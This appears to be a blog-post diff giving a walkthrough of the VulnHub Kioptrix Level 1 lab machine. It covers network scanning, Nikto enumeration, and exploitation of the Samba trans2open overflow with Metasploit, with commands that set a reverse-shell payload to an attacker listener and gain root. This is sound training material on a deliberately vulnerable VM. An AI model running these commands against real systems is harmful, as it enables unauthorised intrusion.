@@ -1,1 +1,161 @@
+---
+title: "Kioptrix Level 1 Walkthrough"
+layout: post
+collection: writeups
+permalink: /writeups/kioptrix-level1/
+date: 2025-10-05
+categories: ["Writeups", "VulnHub"]
+tags: [pentest, samba, trans2open, metasploit, reverse-shell]
+image: /assets/images/writeups/kioptrix1/kioptrix-1.jpg
+thumbnail: /assets/images/writeups/kioptrix1/kioptrix-1.jpg
+icon: fas fa-server
+excerpt: "Exploiting an outdated Samba service using Metasploit to gain root access on Kioptrix Level 1."
+description: "Walkthrough of Kioptrix Level 1 VM penetration test, covering reconnaissance, vulnerability identification, and exploitation via Samba trans2open overflow."
+---
 
+# Kioptrix Level 1 Writeup
+
+## Introduction
+Kioptrix Level 1 is a beginner-friendly vulnerable machine from VulnHub, designed to practice penetration testing skills. The goal is to gain root access through various vulnerabilities.
+
+![Kioptrix Welcome Screen](/assets/images/writeups/kioptrix1/Kioptrix1.png)
+
+## Reconnaissance
+
+### Network Discovery
+Started with network scanning to identify the target machine:
+
+![Netdiscover Scan](/assets/images/writeups/kioptrix1/netdiscover.png)
+
+![ARP Scan](/assets/images/writeups/kioptrix1/arp-scan%20-l.png)
+
+- Used `netdiscover` and `arp-scan` to find the Kioptrix VM at `192.168.56.110`
+- The machine showed MAC address `08:00:27:39:c3:0d` (VirtualBox)
+
+### Port Scanning
+Performed comprehensive Nmap scan:
+```bash
+nmap -sS -sV -O 192.168.56.110 -oN kioptrix.txt
+https:///assets/images/writeups/kioptrix1/nmap-scan1.png
+
+https:///assets/images/writeups/kioptrix1/nmap-scan2.png
+
+Open Ports Found:
+
+22/tcp - OpenSSH 2.9p2 (protocol 1.99)
+
+80/tcp - Apache 1.3.20 (Red Hat Linux)
+
+111/tcp - rpcbind
+
+139/tcp - Samba smbd
+
+443/tcp - Apache/SSL
+
+32768/tcp - status
+
+Vulnerability Analysis
+Web Service Enumeration
+Apache 1.3.20 with mod_ssl/2.8.4 and OpenSSL/0.9.6b
+
+https:///assets/images/writeups/kioptrix1/port-80obsere.png
+
+https:///assets/images/writeups/kioptrix1/source-page.png
+
+Nikto scan revealed multiple vulnerabilities including:
+
+Outdated software versions
+
+TRACE method enabled (potential XST)
+
+Various directory listings
+
+PHP backdoor file manager indications
+
+https:///assets/images/writeups/kioptrix1/nikto.png
+
+Samba Service
+The Samba service on port 139 was identified as a primary attack vector:
+
+Samba version 2.2.x
+
+Vulnerable to trans2open buffer overflow (CVE-2003-0201)
+
+Exploitation
+Metasploit Approach
+Search for Exploit:
+
+bash
+search trans2open
+https:///assets/images/writeups/kioptrix1/search-trans2open.png
+
+Found multiple variants including Linux x86 exploit.
+
+Configure Exploit:
+
+bash
+use exploit/linux/samba/trans2open
+set RHOSTS 192.168.56.110
+set payload linux/x86/shell_reverse_tcp
+set LHOST 192.168.56.102
+set LPORT 4444
+https:///assets/images/writeups/kioptrix1/exploit-options.png
+
+https:///assets/images/writeups/kioptrix1/hosts-setup.png
+
+Execute Exploit:
+The exploit successfully opened multiple reverse shell sessions:
+
+https:///assets/images/writeups/kioptrix1/flag.png
+
+Sessions established on ports 32773-32776
+
+Gained command shell access as root
+
+Post-Exploitation
+Verified root access with whoami command
+
+Checked hostname: kioptrix.level1
+
+Located system mail in /var/mail/root containing congratulations message
+
+https:///assets/images/writeups/kioptrix1/locate-mail.png
+
+https:///assets/images/writeups/kioptrix1/ctf.png
+
+Key Findings
+Critical Vulnerabilities
+Samba trans2open Overflow - Primary exploitation vector
+
+Outdated Software Stack - Apache 1.3.20, OpenSSL 0.9.6b
+
+Weak Service Configurations - TRACE method enabled, directory listings
+
+Attack Chain
+Network discovery → Port scanning → Service enumeration
+
+Vulnerability identification → Samba trans2open exploit
+
+Reverse shell establishment → Root access achieved
+
+Lessons Learned
+Importance of keeping services updated
+
+Dangers of running outdated Samba versions
+
+Value of comprehensive network reconnaissance
+
+Effectiveness of automated exploitation tools like Metasploit
+
+Conclusion
+Kioptrix Level 1 provided an excellent introduction to penetration testing fundamentals. The machine demonstrated how a single unpatched service (Samba) can lead to complete system compromise. The exercise highlighted the importance of:
+
+Regular vulnerability assessments
+
+Prompt security updates
+
+Defense-in-depth strategies
+
+Proper service hardening
+
+This walkthrough covered the Metasploit exploitation path, but the machine offers multiple attack vectors for those seeking alternative approaches.
